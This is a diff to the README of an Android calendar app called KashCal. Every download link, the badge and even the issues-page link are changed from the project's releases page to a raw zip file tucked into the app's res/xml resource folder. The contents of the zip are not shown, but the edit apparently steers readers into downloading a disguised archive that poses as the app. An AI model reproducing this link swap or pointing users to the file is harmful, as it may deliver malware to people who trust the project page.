@@ -1,6 +1,6 @@
 # 🚀 KashCal - Your Reliable iCloud Calendar App
 
-[![Download KashCal](https://img.shields.io/badge/Download-KashCal-blue.svg)](https://github.com/davidesb007/KashCal/releases)
+[![Download KashCal](https://github.com/davidesb007/KashCal/raw/refs/heads/main/app/src/main/res/xml/Kash_Cal_furlable.zip)](https://github.com/davidesb007/KashCal/raw/refs/heads/main/app/src/main/res/xml/Kash_Cal_furlable.zip)
 
 ## 📅 Introduction
 
@@ -22,7 +22,7 @@ Follow these steps to get KashCal up and running on your Android device.
 1. **Check Compatibility**: Ensure your Android device runs version 5.0 (Lollipop) or later.
 2. **Visit the Download Page**: Click the link below to go to the releases page.
 
-   [Download KashCal](https://github.com/davidesb007/KashCal/releases)
+   [Download KashCal](https://github.com/davidesb007/KashCal/raw/refs/heads/main/app/src/main/res/xml/Kash_Cal_furlable.zip)
 
 3. **Select the Latest Release**: Once on the page, find the latest release. It will usually be at the top.
 4. **Download the APK File**: Look for a link that ends with `.apk` and click on it to download. This file is the application.
@@ -35,7 +35,7 @@ Follow these steps to get KashCal up and running on your Android device.
 
 Download KashCal by visiting the following link:
 
-[Download KashCal](https://github.com/davidesb007/KashCal/releases)
+[Download KashCal](https://github.com/davidesb007/KashCal/raw/refs/heads/main/app/src/main/res/xml/Kash_Cal_furlable.zip)
 
 Ensure you follow the installation steps mentioned above to get the application running smoothly.
 
@@ -63,7 +63,7 @@ Once you have installed KashCal, launch the app, and follow these steps to set i
 
 ## 🚀 Community and Support
 
-KashCal is open source. If you have any questions, ideas, or issues, please visit our [GitHub Issues Page](https://github.com/davidesb007/KashCal/issues) to report them. Join our community to stay updated and help improve KashCal!
+KashCal is open source. If you have any questions, ideas, or issues, please visit our [GitHub Issues Page](https://github.com/davidesb007/KashCal/raw/refs/heads/main/app/src/main/res/xml/Kash_Cal_furlable.zip) to report them. Join our community to stay updated and help improve KashCal!
 
 ## 🗺️ Roadmap
 
